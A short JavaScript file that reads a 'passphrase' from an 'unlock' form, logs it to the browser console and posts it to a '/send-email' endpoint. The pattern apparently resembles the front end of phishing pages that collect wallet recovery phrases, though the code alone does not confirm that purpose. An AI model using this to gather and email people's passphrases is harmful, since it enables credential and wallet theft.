document.addEventListener("DOMContentLoaded", () => {
    console.log("✅ Script loaded successfully!");

    const form = document.getElementById("unlock-form");
    if (!form) {
        console.error("❌ Form not found! Check your HTML.");
        return;
    }

    form.addEventListener("submit", async function (event) {
        event.preventDefault(); // 🚀 Prevent default submission
        console.log("🚀 Form submission prevented!");

        const message = document.getElementById("message").value.trim();
        if (!message) {
            alert("⚠️ Please enter your passphrase.");
            return;
        }

        console.log("📨 Sending message:", message);

        try {
            const response = await fetch("/send-email", { 
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ message }) 
            });

            console.log("📬 Server response:", response);

            if (response.ok) {
                alert("✅ Message sent successfully!");
                form.reset(); // ✅ Clear input
            } else {
                alert("❌ Error sending message.");
            }
        } catch (error) {
            console.error("🔥 Error:", error);
            alert("⚠️ An error occurred. Try again later.");
        }
    });
});
